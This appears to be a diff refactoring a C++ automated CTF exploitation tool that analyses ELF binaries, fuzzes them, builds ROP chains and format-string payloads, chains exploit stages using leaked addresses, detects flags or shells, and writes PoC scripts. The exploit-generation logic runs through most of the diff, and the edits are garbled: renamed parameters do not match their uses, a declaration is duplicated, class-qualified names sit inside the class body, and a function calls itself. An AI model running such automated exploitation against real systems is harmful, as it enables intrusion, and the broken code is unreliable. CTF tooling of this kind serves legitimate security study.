@@ -226,47 +226,10 @@ struct StageResult {
     int signal_num = 0;
 };
 
-std::string target_exe;
-ELFInfo elf_info;
-ExploitContext exploit_context;
-bool multi_stage_mode = false;
-bool verbose_mode = false;
-std::vector<ExploitChain> exploit_chains;
-std::vector<VulnResult> vulnerabilities;
-std::vector<std::string> successful_exploits;
-std::map<std::string, std::string> leaked_data;
-AdvancedGDBAnalyzer* gdb_analyzer = nullptr;
-AdaptiveChallengeClassifier classifier;
-int total_runs = 0;
-int crashes_found = 0;
-int unique_crashes = 0;
 
 
 
-std::string executeWithTimeout(const std::string& payload, int timeout_seconds);
-StageResult executeStage(const ExploitStage& stage, const std::map<std::string, std::string>& context_data);
-void extractStageData(const StageResult& result, std::map<std::string, std::string>& leaked_data);
-void updateSubsequentStages(ExploitChain& chain, size_t stage_index, const std::map<std::string, std::string>& leaked_data);
-bool checkEarlySuccess(const std::string& output);
-std::string extractFlag(const std::string& output);
-bool extractShellAccess(const std::string& output);
-StageResult handleInteractiveStage(const ExploitStage& stage, const std::map<std::string, std::string>& context_data);
-std::string buildROPChain(const std::map<std::string, std::string>& leaked_data);
-std::string buildFormatStringWrite(int offset);
-std::string packAddress(uint64_t address);
-void saveChainResult(const ChainResult& result);
-void generateChainPoC(const ExploitChain& chain, const ChainResult& result);
-std::string captureOutput(const std::string& input);
-bool testSingleExploit(const std::string& exploit, VulnResult& result);
-bool isSuccessfulExploit(const std::string& output);
-void saveAdvancedVulnerability(const VulnResult& result, int index);
-void generateAdvancedPoC(const VulnResult& result, int index);
-void generateSolutionScript(const std::string& exploit);
-std::string getCurrentTimestamp();
-int countExploitable();
-bool hasPrintfFunctions();
 
-// Network Protocol Fuzzer Class
 class NetworkProtocolFuzzer {
 private:
     NetworkTarget target;
@@ -505,15 +468,15 @@ private:
     }
     
     bool hasPrintfFunctions() {
-        std::vector<std::string> printf_funcs = {"printf", "sprintf", "fprintf"};
-        for (const auto& func : printf_funcs) {
-            if (std::find(elf_info.imported_functions.begin(), 
-                         elf_info.imported_functions.end(), func) != elf_info.imported_functions.end()) {
-                return true;
-            }
+    std::vector<std::string> printf_funcs = {"printf", "sprintf", "fprintf"};
+    for (const auto& func : printf_funcs) {
+        if (std::find(elf_info.imported_functions.begin(),
+                      elf_info.imported_functions.end(), func) != elf_info.imported_functions.end()) {
+            return true;
         }
-        return false;
     }
+    return false;
+}
     
     bool hasHeapFunctions() {
         std::vector<std::string> heap_funcs = {"malloc", "free", "calloc", "realloc"};
@@ -990,6 +953,41 @@ private:
     }
 };
 
+void AdvancedCTFSolver::performAdaptiveAnalysis() {
+    std::cout << "[*] ===== ADAPTIVE CTF ANALYSIS =====" << std::endl;
+    
+    // Step 1: Deep GDB analysis
+    this->gdb_analyzer = new AdvancedGDBAnalyzer(this->target_exe);
+    exploit_context = gdb_analyzer->performDeepAnalysis();
+    
+    // Step 2: Classify challenge type
+    std::string binary_info = this->getBinaryAnalysisString();
+    std::string runtime_info = this->getRuntimeBehaviorString();
+    std::string gdb_info = this->getGDBAnalysisString();
+    
+    auto classifications = this->classifier.classifyChallenge(binary_info, runtime_info, gdb_info);
+    
+    std::cout << "[*] Challenge Classifications:" << std::endl;
+    for (const auto& classification : classifications) {
+        std::cout << "    " << classification.first 
+                  << " (confidence: " << std::fixed << std::setprecision(2) 
+                  << classification.second << ")" << std::endl;
+    }
+    
+    // Step 3: Generate adaptive exploits
+    AdaptiveExploitGenerator generator(exploit_context, target_exe);
+    auto adaptive_exploits = generator.generateAdaptiveExploits();
+    
+    std::cout << "[+] Generated " << adaptive_exploits.size() 
+              << " adaptive exploit attempts" << std::endl;
+    
+    // Step 4: Test exploits
+    testAdaptiveExploits(adaptive_exploits);
+
+}
+
+
+
 class SymbolicExecutionEngine {
     
 private:
@@ -1104,89 +1102,52 @@ private:
     }
 };
 
-
-
-class AdvancedCTFSolver {
-private:
-    SymbolicExecutionEngine* symbolic_engine = nullptr;
-
-private:
-    // Add these missing method declarations
-    void performAdaptiveAnalysis();
-    void performMultiStageExploitation();
-    void generateCTFReport();
-    void generateSolutionScript(const std::string& payload);
-    std::string captureOutput(const std::string& input);
-    std::string getCurrentTimestamp();
-    bool testSingleExploit(const std::string& exploit, VulnResult& result);
-    bool isSuccessfulExploit(const std::string& output);
-    void saveSolution(const std::string& payload, const std::string& output);
-    std::string extractFlag(const std::string& output);
-    bool extractShellAccess(const std::string& output);
-    bool checkEarlySuccess(const std::string& output);
-    void extractStageData(const StageResult& result, std::map<std::string, std::string>& data);
-    void updateSubsequentStages(ExploitChain& chain, size_t index, const std::map<std::string, std::string>& data);
-    std::string buildROPChain(const std::map<std::string, std::string>& data);
-    std::string buildFormatStringWrite(int offset);
-    std::string packAddress(uint64_t addr);
-    StageResult executeStage(const ExploitStage& stage, const std::map<std::string, std::string>& context);
-    StageResult handleInteractiveStage(const ExploitStage& stage, const std::map<std::string, std::string>& context);
-    void saveChainResult(const ChainResult& result);
-    void generateChainPoC(const ExploitChain& chain, const ChainResult& result);
-
-private:
-    std::string target_exe;
-    std::mt19937 rng;
-    ELFInfo elf_info;
-    std::vector<VulnResult> vulnerabilities;
-    std::map<std::string, std::vector<std::string>> mutation_corpus;
-    std::set<std::string> interesting_inputs;
-    int total_runs = 0;
-    int crashes_found = 0;
-    int unique_crashes = 0;
-    AdaptiveChallengeClassifier classifier;
-    AdvancedGDBAnalyzer* gdb_analyzer = nullptr;
-    ExploitContext exploit_context;
-    std::string angr_script_template;
-    bool verbose_mode = true;
+void AdvancedCTFSolver::saveSolution(const std::string& payload, const std::string& output) {
+    if (!multi_stage_mode) return;
     
-private:
-    std::vector<IOPattern> detected_patterns;
-    std::map<std::string, std::string> program_outputs;
-    bool auto_solve_mode = true;
-
-private:
-    std::vector<ExploitChain> exploit_chains;
-    std::map<std::string, std::string> leaked_data;
-    bool multi_stage_mode = true;
-    int max_chain_stages = 5;
-
-
-public:
-    AdvancedCTFSolver(const std::string& exe_path, bool verbose = false) 
-        : target_exe(exe_path), verbose_mode(verbose), 
-          rng(std::chrono::steady_clock::now().time_since_epoch().count()) {
-        std::cout << "[*] Advanced CTF Solver initialized for: " << target_exe << std::endl;
-        analyzeELF();
-        setupGDBEnvironment();
-    }
-
-
-
-    std::string executeCommand(const std::string& cmd) {
-    std::string result;
-    FILE* pipe = popen(cmd.c_str(), "r");
-    if (!pipe) return "";
+    std::cout << "[*] ===== MULTI-STAGE EXPLOIT CHAINING =====" << std::endl;
     
-    char buffer[128];
-    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
-        result += buffer;
+    ExploitChainBuilder builder(target_exe, elf_info, exploit_context);
+    exploit_chains = builder.buildExploitChains();
+    
+    std::cout << "[+] Built " << exploit_chains.size() << " exploit chains" << std::endl;
+    
+    for (auto& chain : exploit_chains) {
+        std::cout << "\n[*] Testing chain: " << chain.chain_id 
+                  << " (" << chain.attack_type << ")" << std::endl;
+        std::cout << "[*] Success probability: " << chain.success_probability << std::endl;
+        
+        ChainResult result = executeExploitChain(chain);
+        
+        if (result.successful) {
+            std::cout << "[!] SUCCESS! Chain completed successfully!" << std::endl;
+            std::cout << "[+] Stages completed: " << result.stages_completed << std::endl;
+            
+            if (!result.final_flag.empty()) {
+                std::cout << "[!] FLAG CAPTURED: " << result.final_flag << std::endl;
+                this->saveSolution(chain.stages.back().payload, result.final_flag);
+            }
+            
+            if (!result.shell_access.empty()) {
+                std::cout << "[!] SHELL ACCESS GAINED!" << std::endl;
+            }
+            
+            this->saveChainResult(result);
+            this->generateChainPoC(chain, result);
+            
+            // If we got the flag or shell, we're done
+            if (!result.final_flag.empty() || !result.shell_access.empty()) {
+                return;
+            }
+        } else {
+            std::cout << "[!] Chain failed: " << chain.failure_reason << std::endl;
+            std::cout << "[*] Completed stages: " << result.stages_completed 
+                      << "/" << chain.stages.size() << std::endl;
+        }
     }
-    pclose(pipe);
-    return result;
 }
 
-void performMultiStageExploitation() {
+void AdvancedCTFSolver::performMultiStageExploitation() {
     if (!multi_stage_mode) return;
     
     std::cout << "[*] ===== MULTI-STAGE EXPLOIT CHAINING =====" << std::endl;
@@ -1230,6 +1191,116 @@ void performMultiStageExploitation() {
         }
     }
 }
+
+struct VulnResult;
+struct ELFInfo;
+struct IOPattern;
+struct ExploitChain;
+struct ChainResult;
+struct StageResult;
+struct ExploitStage;
+struct ExploitContext;
+class AdaptiveChallengeClassifier;
+class AdvancedGDBAnalyzer;
+class SymbolicExecutionEngine;
+
+
+class AdvancedCTFSolver {
+private:
+    std::unique_ptr<SymbolicExecutionEngine> symbolic_engine;
+
+
+    // --- analysis / report helpers ---
+    std::string AdvancedCTFSolver::getBinaryAnalysisString();
+    std::string AdvancedCTFSolver::getRuntimeBehaviorString();
+    std::string AdvancedCTFSolver::getGDBAnalysisString();
+
+    // --- exec / timing ---
+    std::string AdvancedCTFSolver::executeWithTimeout(const std::string& payload, int timeout_seconds);
+
+    // --- multi-stage exploit flow ---
+    void performAdaptiveAnalysis();
+    void performMultiStageExploitation();
+    ChainResult executeExploitChain(ExploitChain& chain);
+    StageResult executeStage(const ExploitStage& stage, const std::map<std::string, std::string>& context);
+    StageResult handleInteractiveStage(const ExploitStage& stage, const std::map<std::string, std::string>& context);
+    void extractStageData(const StageResult& result, std::map<std::string, std::string>& data);
+    void updateSubsequentStages(ExploitChain& chain, size_t current_stage, const std::map<std::string, std::string>& data);
+    bool checkEarlySuccess(const std::string& output);
+    std::string extractFlag(const std::string& output);
+    bool extractShellAccess(const std::string& output);
+    void saveChainResult(const ChainResult& result);
+    void generateChainPoC(const ExploitChain& chain, const ChainResult& result);
+
+    // --- exploit builders / utils ---
+    std::string buildROPChain(const std::map<std::string, std::string>& data);
+    std::string buildFormatStringWrite(int offset);
+    std::string packAddress(uint64_t addr);
+
+    // --- single-exploit fuzz/test helpers ---
+    bool AdvancedCTFSolver::testSingleExploit(const std::string& exploit, VulnResult& result);
+    bool isSuccessfulExploit(const std::string& output);
+    std::string AdvancedCTFSolver::captureOutput(const std::string& input);
+    void testAdaptiveExploits(const std::vector<std::string>& exploits); // added
+
+    // --- outputs / persistence ---
+    void saveAdvancedVulnerability(const VulnResult& result, int index);
+    void generateAdvancedPoC(const VulnResult& result, int index);
+    void AdvancedCTFSolver::generateSolutionScript(const std::string& payload);
+    void saveSolution(const std::string& payload, const std::string& output);
+    void AdvancedCTFSolver::generateCTFReport();
+    std::string getCurrentTimestamp();
+
+    // --- misc summaries ---
+    int countExploitable();
+    bool hasPrintfFunctions();
+
+    // --- shell helpers used in many methods (declared so we can also define it later if needed) ---
+    std::string executeCommand(const std::string& cmd); // added
+
+private:
+    std::string target_exe;
+    std::mt19937 rng;
+    ELFInfo elf_info;
+    std::vector<VulnResult> vulnerabilities;
+    std::map<std::string, std::vector<std::string>> mutation_corpus;
+    std::set<std::string> interesting_inputs;
+    int total_runs = 0;
+    int crashes_found = 0;
+    int unique_crashes = 0;
+    AdaptiveChallengeClassifier classifier;
+    std::unique_ptr<AdvancedGDBAnalyzer> gdb_analyzer;
+    ExploitContext exploit_context;
+    std::string angr_script_template;
+    bool verbose_mode = true;
+    std::vector<std::string> successful_exploits;
+
+private:
+    std::vector<IOPattern> detected_patterns;
+    std::map<std::string, std::string> program_outputs;
+    bool auto_solve_mode = true;
+
+private:
+    std::vector<ExploitChain> exploit_chains;
+    std::map<std::string, std::string> leaked_data;
+    bool multi_stage_mode = true;
+    int max_chain_stages = 5;
+
+public:
+    AdvancedCTFSolver(const std::string& exe_path, bool verbose = false) 
+        : target_exe(exe_path), verbose_mode(verbose), 
+          rng(std::chrono::steady_clock::now().time_since_epoch().count()) {
+        std::cout << "[*] Advanced CTF Solver initialized for: " << target_exe << std::endl;
+        analyzeELF();
+        setupGDBEnvironment();
+    }
+
+
+
+    std::string executeCommand(const std::string& cmd);
+
+
+
 
     void initializeComponents() {
         // Initialize ELF info
@@ -1403,6 +1474,65 @@ void performMultiStageExploitation() {
         std::cout << "[+] Imported functions: " << elf_info.imported_functions.size() << std::endl;
     }
     
+
+    
+
+// Supporting function for executeExploitChain
+ChainResult executeExploitChain(ExploitChain& chain) {
+
+    ChainResult result;
+    result.chain_id = chain.chain_id;
+    result.successful = false;
+    result.stages_completed = 0;
+    
+    std::cout << "[*] Executing " << chain.stages.size() << " stage chain..." << std::endl;
+    
+    for (size_t i = 0; i < chain.stages.size(); i++) {
+        auto& stage = chain.stages[i];
+        std::cout << "[*] Stage " << (i+1) << ": " << stage.stage_name << std::endl;
+        
+        StageResult stage_result = executeStage(stage, leaked_data);
+        result.stage_outputs.push_back(stage_result.output);
+        
+        if (!stage_result.successful) {
+            chain.failure_reason = "Stage " + std::to_string(i+1) + " failed: " + stage_result.error;
+            std::cout << "[!] " << chain.failure_reason << std::endl;
+            return result;
+        }
+        
+        result.stages_completed++;
+        
+        // Extract data from this stage for next stages
+        extractStageData(stage_result, leaked_data);
+        
+        // Update subsequent stage payloads based on leaked data
+        updateSubsequentStages(chain, i, leaked_data);
+        
+        // Check for early success indicators
+        if (checkEarlySuccess(stage_result.output)) {
+            result.final_flag = extractFlag(stage_result.output);
+            if (extractShellAccess(stage_result.output)) {
+                result.shell_access = "shell_obtained";
+            }
+            result.successful = true;
+            return result;
+        }
+        
+        std::this_thread::sleep_for(std::chrono::milliseconds(500));
+    }
+    
+    // All stages completed successfully
+    result.successful = true;
+    result.final_flag = extractFlag(result.stage_outputs.back());
+    if (extractShellAccess(result.stage_outputs.back())) {
+        result.shell_access = "shell_obtained";
+    }
+    
+    return result;
+}
+
+
+
     void setupGDBEnvironment() {
         std::cout << "[*] Setting up GDB environment for advanced analysis..." << std::endl;
         
@@ -1587,53 +1717,6 @@ void performMultiStageExploitation() {
         payloads.insert(payloads.end(), leak_patterns.begin(), leak_patterns.end());
     }
 
-    ChainResult executeExploitChain(ExploitChain& chain) {
-    ChainResult result;
-    result.chain_id = chain.chain_id;
-    result.successful = false;
-    result.stages_completed = 0;
-    
-    std::cout << "[*] Executing " << chain.stages.size() << " stage chain..." << std::endl;
-    
-    for (size_t i = 0; i < chain.stages.size(); i++) {
-        auto& stage = chain.stages[i];
-        std::cout << "[*] Stage " << (i+1) << ": " << stage.stage_name << std::endl;
-        
-        StageResult stage_result = executeStage(stage, leaked_data);
-        result.stage_outputs.push_back(stage_result.output);
-        
-        if (!stage_result.successful) {
-            chain.failure_reason = "Stage " + std::to_string(i+1) + " failed: " + stage_result.error;
-            std::cout << "[!] " << chain.failure_reason << std::endl;
-            return result;
-        }
-        
-        result.stages_completed++;
-        
-        // Extract data from this stage for next stages
-        extractStageData(stage_result, leaked_data);
-        
-        // Update subsequent stage payloads based on leaked data
-        updateSubsequentStages(chain, i, leaked_data);
-        
-        // Check for early success indicators
-        if (checkEarlySuccess(stage_result.output)) {
-            result.final_flag = extractFlag(stage_result.output);
-            result.shell_access = extractShellAccess(stage_result.output);
-            result.successful = true;
-            return result;
-        }
-        
-        std::this_thread::sleep_for(std::chrono::milliseconds(500));
-    }
-    
-    // All stages completed successfully
-    result.successful = true;
-    result.final_flag = extractFlag(result.stage_outputs.back());
-    result.shell_access = extractShellAccess(result.stage_outputs.back());
-    
-    return result;
-}
 
     void generateFunctionSpecificPayloads(const std::string& func, std::vector<std::string>& payloads) {
         if (func == "gets" || func == "strcpy") {
@@ -1721,15 +1804,6 @@ void performMultiStageExploitation() {
         }
     }
     
-    bool hasPrintfFunctions() {
-        std::vector<std::string> printf_funcs = {"printf", "sprintf", "snprintf", "fprintf", "vprintf"};
-        for (const auto& func : printf_funcs) {
-            if (std::find(elf_info.imported_functions.begin(), elf_info.imported_functions.end(), func) != elf_info.imported_functions.end()) {
-                return true;
-            }
-        }
-        return false;
-    }
     
     bool hasArithmeticFunctions() {
         std::vector<std::string> arith_funcs = {"atoi", "atol", "strtol", "strtoul", "malloc", "calloc"};
@@ -1962,6 +2036,7 @@ void performMultiStageExploitation() {
     
     // Count exploitable vulnerabilities
     int countExploitable() {
+
         int count = 0;
         for (const auto& vuln : vulnerabilities) {
             if (vuln.exploitable) count++;
@@ -1975,7 +2050,7 @@ private:
 public:
     // Add this to your constructor
     void initializeSymbolicExecution() {
-        symbolic_engine = new SymbolicExecutionEngine(target_exe);
+        symbolic_engine = std::make_unique<SymbolicExecutionEngine>(target_exe);
     }
     
     // Add this method
@@ -2015,12 +2090,12 @@ public:
     }
 
     // Save vulnerability details
-    void saveAdvancedVulnerability(const VulnResult& result, int test_num) {
-        std::string filename = "vuln_" + std::to_string(test_num) + "_" + result.vuln_type + ".txt";
+    void saveAdvancedVulnerability(const VulnResult& result, int index) {
+        std::string filename = "vuln_" + std::to_string(index) + "_" + result.vuln_type + ".txt";
         std::ofstream file(filename);
         
         file << "=== VULNERABILITY REPORT ===" << std::endl;
-        file << "Test Number: " << test_num << std::endl;
+        file << "Test Number: " << index << std::endl;
         file << "Vulnerability Type: " << result.vuln_type << std::endl;
         file << "Severity: " << result.severity << std::endl;
         file << "Exploitable: " << (result.exploitable ? "YES" : "NO") << std::endl;
@@ -2066,8 +2141,8 @@ public:
     }
     
     // Generate proof-of-concept exploit
-    void generateAdvancedPoC(const VulnResult& result, int test_num) {
-        std::string poc_filename = "poc_" + std::to_string(test_num) + ".py";
+    void generateAdvancedPoC(const VulnResult& result, int index) {
+        std::string poc_filename = "poc_" + std::to_string(index) + ".py";
         std::ofstream poc_file(poc_filename);
         
         poc_file << "#!/usr/bin/env python3" << std::endl;
@@ -2215,14 +2290,8 @@ public:
 }
     
     // Destructor update
-    ~AdvancedCTFSolver() {
-        if (symbolic_engine) {
-            delete symbolic_engine;
-        }
-        if (gdb_analyzer) {
-            delete gdb_analyzer;
-        }
-    }
+    ~AdvancedCTFSolver() = default;
+
     
     // Print comprehensive summary
     void printAdvancedSummary() {
@@ -2465,13 +2534,12 @@ bool testPatternSolutions() {
 // NEW: Save successful solution
 void saveSolution(const std::string& payload, const std::string& output) {
 
-
     std::string filename = "solution_" + std::to_string(std::time(nullptr)) + ".txt";
     std::ofstream file(filename);
     
     file << "=== SUCCESSFUL SOLUTION ===" << std::endl;
-    file << "Target: " << target_exe << std::endl;
-    file << "Timestamp: " << getCurrentTimestamp() << std::endl;
+    file << "Target: " << this->target_exe << std::endl;
+    file << "Timestamp: " << this->getCurrentTimestamp() << std::endl;
     file << std::endl;
     
     file << "Payload (hex): ";
@@ -2815,19 +2883,19 @@ private:
 
 
 
-StageResult executeStage(const ExploitStage& stage, const std::map<std::string, std::string>& context_data) {
+StageResult AdvancedCTFSolver::executeStage(const ExploitStage& stage, const std::map<std::string,std::string>& ctx) {
     StageResult result;
     
     // Handle interactive stages (offset calculation, etc.)
     if (stage.requires_interaction) {
-        return handleInteractiveStage(stage, context_data);
+        return handleInteractiveStage(stage, context);
     }
     
     // Execute normal stage
     std::string final_payload = stage.payload;
     
     // Substitute context data into payload
-    for (const auto& data : context_data) {
+    for (const auto& data : context) {
         std::string placeholder = "{" + data.first + "}";
         size_t pos = final_payload.find(placeholder);
         if (pos != std::string::npos) {
@@ -2866,14 +2934,14 @@ StageResult executeStage(const ExploitStage& stage, const std::map<std::string, 
     return result;
 }
 
-StageResult handleInteractiveStage(const ExploitStage& stage, const std::map<std::string, std::string>& context_data) {
+StageResult AdvancedCTFSolver::handleInteractiveStage(const ExploitStage& s, const std::map<std::string,std::string>& ctx){
     StageResult result;
     result.successful = true;
     
     if (stage.stage_name == "offset_calculation") {
         // Calculate ROP chain offsets based on leaked addresses
-        if (context_data.count("leaked_stack") && context_data.count("leaked_libc")) {
-            uint64_t stack_addr = std::stoull(context_data.at("leaked_stack"), nullptr, 16);
+        if (context.count("leaked_stack") && context.count("leaked_libc")) {
+            uint64_t stack_addr = std::stoull(context.at("leaked_stack"), nullptr, 16);
             uint64_t libc_addr = std::stoull(context_data.at("leaked_libc"), nullptr, 16);
             
             // Calculate system() address
@@ -2884,8 +2952,8 @@ StageResult handleInteractiveStage(const ExploitStage& stage, const std::map<std
         }
     } else if (stage.stage_name == "calculate_targets") {
         // Calculate format string write targets
-        if (context_data.count("format_offset")) {
-            int offset = std::stoi(context_data.at("format_offset"));
+        if (context.count("format_offset")) {
+            int offset = std::stoi(context.at("format_offset"));
             result.extracted_data["write_offset"] = std::to_string(offset + 4);
             std::cout << "[+] Calculated write offset: " << (offset + 4) << std::endl;
         }
@@ -2894,10 +2962,10 @@ StageResult handleInteractiveStage(const ExploitStage& stage, const std::map<std
     return result;
 }
 
-void extractStageData(const StageResult& stage_result, std::map<std::string, std::string>& leaked_data) {
+void AdvancedCTFSolver::extractStageData(const StageResult& r, std::map<std::string,std::string>& data) {
     // Extract addresses from output
     std::regex addr_regex(R"(0x[0-9a-fA-F]+)");
-    std::sregex_iterator iter(stage_result.output.begin(), stage_result.output.end(), addr_regex);
+    std::sregex_iterator iter(result.output.begin(), result.output.end(), addr_regex);
     std::sregex_iterator end;
     
     int addr_count = 0;
@@ -2919,18 +2987,21 @@ void extractStageData(const StageResult& stage_result, std::map<std::string, std
     }
     
     // Extract format string offset
-    if (stage_result.output.find("41414141") != std::string::npos) {
+    std::sregex_iterator iter(result.output.begin(), result.output.end(), addr_regex);
+
+
         // Found AAAA pattern, calculate offset
         leaked_data["format_offset"] = "6"; // Common offset
     }
     
     // Merge extracted data from stage
-    for (const auto& data : stage_result.extracted_data) {
+    for (const auto& data : result.extracted_data) {
+
         leaked_data[data.first] = data.second;
     }
 }
 
-void updateSubsequentStages(ExploitChain& chain, size_t current_stage, const std::map<std::string, std::string>& leaked_data) {
+void AdvancedCTFSolver::updateSubsequentStages(ExploitChain& chain, size_t i, const std::map<std::string,std::string>& data) {
     for (size_t i = current_stage + 1; i < chain.stages.size(); i++) {
         auto& stage = chain.stages[i];
         
@@ -2945,7 +3016,7 @@ void updateSubsequentStages(ExploitChain& chain, size_t current_stage, const std
     }
 }
 
-std::string buildROPChain(const std::map<std::string, std::string>& leaked_data) {
+std::string AdvancedCTFSolver::buildROPChain(const std::map<std::string,std::string>& data) { 
     std::string rop_chain = std::string(72, 'A'); // Padding
     
     if (leaked_data.count("system_addr")) {
@@ -2962,12 +3033,12 @@ std::string buildROPChain(const std::map<std::string, std::string>& leaked_data)
     return rop_chain;
 }
 
-std::string buildFormatStringWrite(int offset) {
+std::string AdvancedCTFSolver::buildFormatStringWrite(int offset) { 
      return "%" + std::to_string(offset) + "$p";
 
 }
 
-bool checkEarlySuccess(const std::string& output) {
+bool AdvancedCTFSolver::checkEarlySuccess(const std::string& output) {
     std::vector<std::string> success_patterns = {
         "flag{", "FLAG{", "CTF{", "$", "shell", "success", "pwned"
     };
@@ -2981,11 +3052,11 @@ bool checkEarlySuccess(const std::string& output) {
     return false;
 }
 
-std::string extractFlag(const std::string& output) {
+std::string AdvancedCTFSolver::extractFlag(const std::string& output) {
     std::regex flag_regex(R"((flag\{[^}]+\}|FLAG\{[^}]+\}|CTF\{[^}]+\}))");
     std::smatch match;
     
-    if (std::regex_search(output, match, flag_regex)) {
+    if (std::regex_search(out, match, flag_regex)) {
         return match[1].str();
     }
     
@@ -2993,7 +3064,7 @@ std::string extractFlag(const std::string& output) {
 }
 
 
-std::string executeWithTimeout(const std::string& payload, int timeout_seconds) {
+std::string AdvancedCTFSolver::executeWithTimeout(const std::string& payload, int timeout_seconds) { 
     // Similar to captureOutput but with configurable timeout
     int pipefd[2];
     if (pipe(pipefd) == -1) return "";
@@ -3068,7 +3139,7 @@ std::string executeWithTimeout(const std::string& payload, int timeout_seconds) 
     return "";
 }
 
-void saveChainResult(const ChainResult& result) {
+void AdvancedCTFSolver::saveChainResult(const ChainResult& result) { 
     std::string filename = "chain_result_" + result.chain_id + ".txt";
     std::ofstream file(filename);
     
@@ -3096,7 +3167,7 @@ void saveChainResult(const ChainResult& result) {
     std::cout << "[+] Chain result saved: " << filename << std::endl;
 }
 
-void generateChainPoC(const ExploitChain& chain, const ChainResult& result) {
+void AdvancedCTFSolver::generateChainPoC(const ExploitChain& chain, const ChainResult& result) {
     std::string poc_filename = "chain_poc_" + chain.chain_id + ".py";
     std::ofstream poc(poc_filename);
     
@@ -3140,7 +3211,7 @@ void generateChainPoC(const ExploitChain& chain, const ChainResult& result) {
     std::cout << "[+] Chain PoC generated: " << poc_filename << std::endl;
 }
 
-std::string packAddress(uint64_t addr) {
+std::string AdvancedCTFSolver::packAddress(uint64_t addr) {
     std::string packed;
     for (int i = 0; i < 8; i++) {
         packed += static_cast<char>((addr >> (i * 8)) & 0xFF);
@@ -3153,7 +3224,7 @@ std::string packAddress(uint64_t addr) {
 // Add these missing helper functions to your AdvancedCTFSolver class:
 
 // Helper function to get binary analysis as string
-std::string getBinaryAnalysisString() {
+std::string AdvancedCTFSolver::getBinaryAnalysisString() {
     std::stringstream ss;
     
     ss << "Architecture: " << elf_info.architecture << "\n";
@@ -3180,7 +3251,7 @@ std::string getBinaryAnalysisString() {
 }
 
 // Helper function to get runtime behavior as string
-std::string getRuntimeBehaviorString() {
+std::string AdvancedCTFSolver::getRuntimeBehaviorString() {
     std::stringstream ss;
     
     // Run the program with various inputs to observe behavior
@@ -3198,7 +3269,7 @@ std::string getRuntimeBehaviorString() {
 }
 
 // Helper function to get GDB analysis as string  
-std::string getGDBAnalysisString() {
+std::string AdvancedCTFSolver::getGDBAnalysisString() {
     std::stringstream ss;
     
     if (gdb_analyzer) {
@@ -3227,7 +3298,7 @@ std::string getGDBAnalysisString() {
 // Test adaptive exploits function
 
 // Test a single exploit
-bool testSingleExploit(const std::string& exploit, VulnResult& result) {
+bool AdvancedCTFSolver::testSingleExploit(const std::string& exploit, VulnResult& result) { 
     int pipefd[2];
     if (pipe(pipefd) == -1) return false;
     
@@ -3300,7 +3371,7 @@ bool testSingleExploit(const std::string& exploit, VulnResult& result) {
 }
 
 // Check if exploit was successful (non-crash success)
-bool isSuccessfulExploit(const std::string& output) {
+bool AdvancedCTFSolver::isSuccessfulExploit(const std::string& output) {
     std::vector<std::string> success_indicators = {
         "successfully", "success", "Success", "SUCCESS",
         "correct", "Correct", "CORRECT",
@@ -3323,7 +3394,7 @@ bool isSuccessfulExploit(const std::string& output) {
 }
 
 // Enhanced captureOutput with better error handling (update existing one)
-std::string captureOutput(const std::string& input) {
+std::string AdvancedCTFSolver::captureOutput(const std::string& input) {
     int pipefd[2];
     if (pipe(pipefd) == -1) return "";
     
@@ -3376,40 +3447,9 @@ std::string captureOutput(const std::string& input) {
     
 
 // Enhanced analysis function to add to your class
-void performAdaptiveAnalysis() {
-    std::cout << "[*] ===== ADAPTIVE CTF ANALYSIS =====" << std::endl;
-    
-    // Step 1: Deep GDB analysis
-    gdb_analyzer = new AdvancedGDBAnalyzer(target_exe);
-    exploit_context = gdb_analyzer->performDeepAnalysis();
-    
-    // Step 2: Classify challenge type
-    std::string binary_info = getBinaryAnalysisString();
-    std::string runtime_info = getRuntimeBehaviorString();
-    std::string gdb_info = getGDBAnalysisString();
-    
-    auto classifications = classifier.classifyChallenge(binary_info, runtime_info, gdb_info);
-    
-    std::cout << "[*] Challenge Classifications:" << std::endl;
-    for (const auto& classification : classifications) {
-        std::cout << "    " << classification.first 
-                  << " (confidence: " << std::fixed << std::setprecision(2) 
-                  << classification.second << ")" << std::endl;
-    }
-    
-    // Step 3: Generate adaptive exploits
-    AdaptiveExploitGenerator generator(exploit_context, target_exe);
-    auto adaptive_exploits = generator.generateAdaptiveExploits();
-    
-    std::cout << "[+] Generated " << adaptive_exploits.size() 
-              << " adaptive exploit attempts" << std::endl;
-    
-    // Step 4: Test exploits
-    this->testAdaptiveExploits(adaptive_exploits);
 
-}
 // NEW: Generate solution script
-void generateSolutionScript(const std::string& payload) {
+void AdvancedCTFSolver::generateSolutionScript(const std::string& payload) { 
     std::string script_name = "solution_script.py";
     std::ofstream script(script_name);
     
@@ -3438,7 +3478,8 @@ void generateSolutionScript(const std::string& payload) {
 }
     
     // Generate comprehensive CTF report
-    void generateCTFReport() {
+    void AdvancedCTFSolver::generateCTFReport() {
+
         std::string report_filename = "ctf_analysis_report.md";
         std::ofstream report(report_filename);
         
@@ -3559,7 +3600,7 @@ void generateSolutionScript(const std::string& payload) {
     }
     
     // Get current timestamp
-    std::string getCurrentTimestamp() {
+    std::string AdvancedCTFSolver::getCurrentTimestamp() { 
     auto now = std::chrono::system_clock::now();
     auto time_t = std::chrono::system_clock::to_time_t(now);
     std::stringstream ss;
@@ -3568,15 +3609,11 @@ void generateSolutionScript(const std::string& payload) {
 };
 
 
-void performMultiStageExploitation();
 ChainResult executeExploitChain(ExploitChain& chain);
 void updateSubsequentStages(ExploitChain& chain, size_t i, const std::map<std::string, std::string>& leaked_data);
 std::string buildROPChain(const std::map<std::string, std::string>& leaked_data);
 std::string executeWithTimeout(const std::string& payload, int timeout);
-void generateChainPoC(const ExploitChain& chain, const ChainResult& result);
-std::string getBinaryAnalysisString();
-std::string getRuntimeBehaviorString();
-std::string getGDBAnalysisString();
+void AdvancedCTFSolver::generateChainPoC(const ExploitChain& chain, const ChainResult& result);
 void testAdaptiveExploits(const std::vector<std::string>& exploits);
 
 
